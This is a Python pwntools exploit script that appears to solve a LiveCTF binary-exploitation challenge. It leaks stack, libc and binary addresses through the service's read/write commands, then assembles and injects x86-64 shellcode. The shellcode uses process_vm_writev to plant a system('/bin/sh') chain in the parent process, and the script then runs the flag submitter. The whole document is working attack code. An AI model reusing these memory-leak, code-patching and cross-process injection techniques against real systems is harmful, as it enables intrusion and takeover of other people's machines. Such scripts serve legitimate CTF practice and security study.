#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
def read(addr):
    io.sendline(b'1 %x'%addr)
    io.recvuntil(b'Value: ')
    return int(io.recvline(),16)

def write(addr, value):
    io.sendline(b'2 %x %x'%(value, addr))
    io.recvuntil(b'Address: ')

stack = read(1)
for i in range(0x200):
    stack -= 8
    val = read(stack)
    print(hex(val))
    if val & 0xfff == 0xe40:
        libc = val - 0x29e40
    if val & 0xfff == 0x484:
        bin = val - 0x1484
        break
print(hex(bin), hex(libc))
sh = asm("""
mov rbx, 0x%x
         add rsp, 8
         push __NR_getppid
pop rax
         syscall
         push rax
         pop rbp

a:
         push 0x137
         pop rax
         mov edi, ebp
         lea rsi, [rip+lvec]
         lea rcx, [rip+value]

         lea rdx, [rbx+0x2a3e6]
         mov qword ptr [rcx], rdx
         lea rdx, [rbx+0x2a3e5]
         mov qword ptr [rcx+8], rdx
         lea rdx, [rbx+0x1d8678]
         mov qword ptr [rcx+16], rdx
         lea rdx, [rbx+0x50d70]
         mov qword ptr [rcx+24], rdx
         
         mov [rsi], rcx
         mov edx, 1
         lea r10, [rip+rvec]
         mov [r10], rsp
         mov r8d, 1
         xor r9, r9
         syscall
         jmp a

         .align 0x10
         lvec:
         .quad 0, 32
         rvec:
         .quad 0, 32
         value:
         .quad 0, 0, 0
         """ % libc, arch='amd64')
sh += b'\x00' * (-len(sh) & 7)
open('b.bin','wb').write(sh)
sh = [u64(sh[i:i+8]) for i in range(0, len(sh), 8)]
for i in range(len(sh)):
    write(bin+0x1486+8+i*8, sh[i])

write(bin+0x1486, u16(b'\xeb\x06'))
print(hex(stack))
io.sendline(b'3')

io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)


# io.interactive()